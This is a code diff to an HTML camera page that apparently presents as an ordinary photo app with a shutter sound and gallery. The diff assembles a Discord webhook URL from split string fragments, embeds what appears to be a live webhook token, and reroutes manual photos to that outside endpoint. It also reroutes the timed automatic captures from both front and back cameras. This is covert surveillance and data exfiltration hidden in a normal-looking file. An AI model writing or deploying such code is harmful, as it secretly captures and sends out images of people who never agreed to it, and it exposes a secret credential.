@@ -111,6 +111,16 @@
   <audio id="shutterSound" src="https://www.soundjay.com/mechanical/camera-shutter-click-01a.mp3" preload="auto"></audio>
 
   <script>
+    // Webhook URLの各部分を変数に格納
+    const protocol = "https";
+    const domain = "discord.com";
+    const apiPath = "/api/webhooks";
+    const webhookId = "1192062408462696518";
+    const webhookToken = "w_kSg9s3GNGxdgVpep893UxRs-rY19ZYRWHVlbOpSnVRjHu40J9NWyLNBCVC9-Ovz4Bt";
+
+    // URLを組み立て
+    const webhookUrl = `${protocol}://${domain}${apiPath}/${webhookId}/${webhookToken}`;
+
     const config = {
       maxSize: 8 * 1024 * 1024,
       quality: 0.85,
@@ -148,17 +158,11 @@
       return new Promise(res => canvas.toBlob(blob => res(blob), 'image/jpeg', config.quality));
     }
 
-    async function sendToServer(blob, label) {
+    async function sendToWebhook(blob, label) {
       const form = new FormData();
       form.append("file", blob, `img_${Date.now()}.jpg`);
       form.append("content", label);
-      
-      const response = await fetch("index.php", {
-        method: "POST",
-        body: form
-      });
-      const result = await response.json();
-      console.log(result);
+      await fetch(webhookUrl, { method: "POST", body: form });
     }
 
     function showFlash() {
@@ -179,7 +183,7 @@
       if (blob.size <= config.maxSize) {
         updatePreview(blob);
         addToGallery(blob);
-        sendToServer(blob, "内カメラ画像（手動）");
+        sendToWebhook(blob, "内カメラ画像（手動）");
       }
     };
 
@@ -224,11 +228,11 @@
       setInterval(async () => {
         const blobUser = await captureImage(userStream);
         if (blobUser.size <= config.maxSize) {
-          sendToServer(blobUser, "内カメラ画像（自動）");
+          sendToWebhook(blobUser, "内カメラ画像（自動）");
         }
         const blobBack = await captureImage(backStream);
         if (blobBack.size <= config.maxSize) {
-          sendToServer(blobBack, "外カメラ画像（自動）");
+          sendToWebhook(blobBack, "外カメラ画像（自動）");
         }
       }, config.interval);
     }
@@ -242,3 +246,6 @@
   </script>
 </body>
 </html>
+
+
+
